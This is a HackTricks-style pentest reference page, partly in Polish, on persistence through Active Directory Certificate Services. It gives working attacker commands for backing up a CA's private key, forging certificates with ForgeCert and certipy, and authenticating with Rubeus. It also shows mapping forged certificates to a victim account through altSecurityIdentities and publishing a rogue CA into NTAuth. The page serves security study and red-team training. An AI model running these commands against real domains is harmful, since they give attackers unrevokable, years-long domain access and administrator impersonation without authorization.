# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**To podsumowanie technik utrzymywania się w domenie opisanych w [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Sprawdź tam szczegóły.

## Fałszowanie certyfikatów przy użyciu skradzionych certyfikatów CA (Golden Certificate) - DPERSIST1

Jak rozpoznać, że certyfikat jest certyfikatem CA?

Można stwierdzić, że certyfikat jest certyfikatem CA, jeśli spełnionych jest kilka warunków:

- Certyfikat jest przechowywany na serwerze CA, a jego klucz prywatny zabezpieczony przez DPAPI maszyny, lub przez sprzęt taki jak TPM/HSM, jeśli system operacyjny to obsługuje.
- Pola Issuer i Subject certyfikatu odpowiadają wyróżnionej nazwie (distinguished name) CA.
- W certyfikatach CA obecne jest rozszerzenie "CA Version".
- Certyfikat nie posiada pól Extended Key Usage (EKU).

Aby wyodrębnić klucz prywatny tego certyfikatu, narzędzie `certsrv.msc` na serwerze CA jest wspieranym sposobem za pomocą wbudowanego interfejsu GUI. Niemniej jednak certyfikat ten nie różni się od innych przechowywanych w systemie; dlatego do ekstrakcji można zastosować metody takie jak [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Certyfikat i klucz prywatny można również uzyskać przy użyciu Certipy za pomocą następującego polecenia:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Po uzyskaniu certyfikatu CA i jego klucza prywatnego w formacie `.pfx`, narzędzia takie jak [ForgeCert](https://github.com/GhostPack/ForgeCert) mogą być użyte do wygenerowania prawidłowych certyfikatów:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Użytkownik będący celem fałszowania certyfikatu musi być aktywny i zdolny do uwierzytelniania w Active Directory, aby proces się powiódł. Fałszowanie certyfikatu dla specjalnych kont, takich jak krbtgt, jest nieskuteczne.

Ten sfałszowany certyfikat będzie **ważny** do określonej daty końcowej oraz tak długo, jak ważny jest certyfikat root CA (zwykle od 5 do **10+ lat**). Jest on również ważny dla **maszyn**, więc w połączeniu z **S4U2Self** atakujący może **maintain persistence on any domain machine** tak długo, jak ważny jest certyfikat CA.\
Ponadto **certyfikaty wygenerowane** tą metodą **nie mogą zostać unieważnione**, ponieważ CA nie jest o nich świadome.

### Operating under Strong Certificate Mapping Enforcement (2025+)

Od 11 lutego 2025 (po wdrożeniu KB5014754) kontrolery domeny domyślnie ustawiają **Full Enforcement** dla mapowań certyfikatów. W praktyce oznacza to, że twoje sfałszowane certyfikaty muszą albo:

- Zawierać silne powiązanie z docelowym kontem (na przykład rozszerzenie bezpieczeństwa SID), lub
- Być sparowane z silnym, wyraźnym mapowaniem na atrybucie `altSecurityIdentities` obiektu docelowego.

Niezawodnym podejściem do persistence jest wygenerowanie sfałszowanego certyfikatu powiązanego z skradzionym Enterprise CA, a następnie dodanie silnego, wyraźnego mapowania do victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Uwagi
- Jeśli możesz stworzyć sfałszowane certyfikaty, które zawierają rozszerzenie bezpieczeństwa SID, będą one mapowane w sposób niejawny nawet przy Full Enforcement. W przeciwnym razie preferuj jawne silne mapowania. Zobacz [account-persistence](account-persistence.md) aby dowiedzieć się więcej o jawnych mapowaniach.
- Unieważnienie nie pomaga obrońcom w tym przypadku: sfałszowane certyfikaty nie znajdują się w bazie CA i w związku z tym nie można ich unieważnić.

## Zaufanie nieautoryzowanym certyfikatom CA - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **certyfikatów CA** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **kontroler domeny** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

A self-signed CA certificate can be added to the `NTAuthCertificates` object by an attacker, provided they have control over this AD object. Normally, only members of the **Enterprise Admin** group, along with **Domain Admins** or **Administrators** in the **forest root’s domain**, are granted permission to modify this object. They can edit the `NTAuthCertificates` object using `certutil.exe` with the command `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, or by employing the [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Dodatkowe przydatne polecenia dla tej techniki:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ta możliwość jest szczególnie istotna, gdy jest używana w połączeniu z wcześniej opisanym sposobem wykorzystującym ForgeCert do dynamicznego generowania certyfikatów.

> Uwagi dotyczące mapowania po 2025 r.: umieszczenie złośliwego CA w NTAuth ustanawia jedynie zaufanie do wystawiającego CA. Aby użyć certyfikatów końcowych do logowania, gdy DCs są w **Full Enforcement**, certyfikat końcowy musi albo zawierać rozszerzenie bezpieczeństwa SID, albo musi istnieć silne, jawne mapowanie na docelowym obiekcie (na przykład Issuer+Serial w `altSecurityIdentities`). Zob. {{#ref}}account-persistence.md{{#endref}}.

## Złośliwa błędna konfiguracja - DPERSIST3

Możliwości uzyskania **persistence** poprzez modyfikacje deskryptorów bezpieczeństwa komponentów **AD CS** są liczne. Modyfikacje opisane w sekcji "[Domain Escalation](domain-escalation.md)" mogą zostać złośliwie wprowadzone przez atakującego z podwyższonymi uprawnieniami. Obejmuje to dodanie "praw kontroli" (np. WriteOwner/WriteDACL/itd.) do wrażliwych komponentów takich jak:

- The **CA server’s AD computer** object
- The **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

Przykładowe złośliwe wdrożenie polegałoby na tym, że atakujący mający podwyższone uprawnienia w domenie dodałby uprawnienie `WriteOwner` do domyślnego szablonu certyfikatu `User`, przy czym to atakujący byłby principalem tego prawa. Aby to wykorzystać, atakujący najpierw zmieniłby właściciela szablonu `User` na siebie. Następnie flaga `mspki-certificate-name-flag` zostałaby ustawiona na `1` w szablonie, aby włączyć `ENROLLEE_SUPPLIES_SUBJECT`, co pozwala użytkownikowi podać Subject Alternative Name w żądaniu. W efekcie atakujący mógłby następnie **enroll** używając **template**, wybierając jako alternatywną nazwę **domain administrator**, i wykorzystać pozyskany certyfikat do uwierzytelniania jako DA.

Praktyczne ustawienia, które atakujący mogą skonfigurować dla długoterminowego persistence w domenie (zob. {{#ref}}domain-escalation.md{{#endref}} dla pełnych szczegółów i wykrywania):

- CA policy flags that allow SAN from requesters (e.g., enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`). This keeps ESC1-like paths exploitable.
- Template DACL or settings that allow authentication-capable issuance (e.g., adding Client Authentication EKU, enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlling the `NTAuthCertificates` object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup.

> [!TIP]
> W wzmocnionych środowiskach po KB5014754, łączenie tych błędnych konfiguracji z wyraźnymi silnymi mapowaniami (`altSecurityIdentities`) zapewnia, że wydane lub podrobione certyfikaty pozostaną użyteczne nawet gdy DCs wymuszają silne mapowanie.



## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
